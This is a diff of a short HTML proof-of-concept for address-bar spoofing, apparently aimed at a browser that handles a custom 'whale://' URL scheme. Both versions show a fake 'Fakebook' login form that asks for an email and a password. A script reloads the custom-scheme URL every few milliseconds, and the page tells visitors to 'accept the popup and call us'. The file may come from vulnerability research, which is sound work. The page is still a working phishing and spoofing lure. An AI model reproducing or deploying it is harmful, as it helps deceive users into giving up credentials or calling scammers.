@@ -1,35 +1,16 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Address Bar Spoofing Example</title>
-    <script>
-        // Function to continuously redirect the page
-        var redirectInterval = setInterval(redirectContinuously, 5);
-        
-        function redirectContinuously() {
-            window.location.href = "whale://test.shhnjk.com/alert.html";
-        }
-        
-        // Function to stop the continuous redirection
-        function stopRedirect() {
-            clearInterval(redirectInterval);
-            console.log("Continuous redirection stopped.");
-        }
-        
-        // Redirect to Google after 15 seconds
-        setTimeout(function() {
-            window.location.href = "https://www.google.com";
-        }, 15000); // 15000 milliseconds = 15 seconds
-    </script>
-</head>
-<body>
-    <h1>This is Fakebook</h1>
-    <h2>Please accept the popup and call us</h2>
-    <form>
-        Email: <input type="text" name="username" placeholder="Enter email"><br>
-        Password: <input type="password" name="password" placeholder="Enter password">
-    </form>
-</body>
+<html>
+<title>Address Bar spoofing </title>
+<h1> This is Fakebook </h1>
+<title>testing </title>
+<h1> This is Fakebook please acept the popup nd call us  </h1>
+<form>
+Email: <input type="text" name="username" placeholder="add email"><br>
+Password: <input type="text" name="password" placeholder="pass">
+<script>
+function f()
+{
+location ="whale://test.shhnjk.com/alert.html"
+}
+setInterval("f()", 5);
+  </script>
 </html>
